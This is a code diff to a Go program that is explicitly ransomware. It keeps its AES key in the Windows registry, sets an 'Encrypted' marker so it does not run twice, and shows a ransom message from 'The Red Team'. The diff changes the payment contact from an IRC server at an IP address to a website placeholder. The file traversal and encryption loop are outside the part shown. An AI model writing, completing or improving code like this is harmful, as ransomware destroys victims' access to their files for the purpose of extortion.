@@ -46,8 +46,19 @@ func main() {
 		fmt.Println(err)
 	}
 	key := []byte(aesKey)
+
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
+	check, keyType, err := k.GetStringValue("Encrypted")
+
+	if check == "1" {
+		dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using our website <url>.")
+		os.Exit(1)
+	}
+	k.SetStringValue("Encrypted", "1")
 	k.SetStringValue("KeyBackup", aesKey)
+
+	print(keyType)
+
 	c, err := aes.NewCipher(key)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
@@ -69,5 +80,5 @@ func main() {
 			println("f", err)
 		}
 	}
-	dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using the XChat IRC Client at 34.201.53.106:6667 for payment option.")
+	dialog.Alert("Thank you for choosing The Red Team as your source of ransomware!\n\nPlease contact us using our website <url>.")
 }
